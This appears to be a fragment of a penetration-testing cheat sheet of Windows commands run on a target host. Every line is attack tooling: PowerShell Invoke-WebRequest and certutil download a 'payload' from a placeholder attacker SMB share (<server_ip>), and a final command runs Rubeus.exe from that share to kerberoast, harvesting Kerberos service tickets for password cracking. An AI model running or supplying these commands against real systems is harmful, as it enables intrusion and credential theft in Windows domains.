		# On Client Host (Target) RECEIVER
PS:> Get-ChildItem \\<server_ip>\share_name    # Test access
PS:> Invoke-WebRequest -Uri "\\<server_ip>\<share_name>\payload" -OutFile "$env:USERPROFILE\Desktop\payload"
> certutil -urlcache -split -f "\\<server_ip>\<share_name>\payload" C:\Users\Administrator\Desktop\payload
PS:>cmd.exe /c "\\<server_ip>\share_name\Rubeus.exe kerberoast"
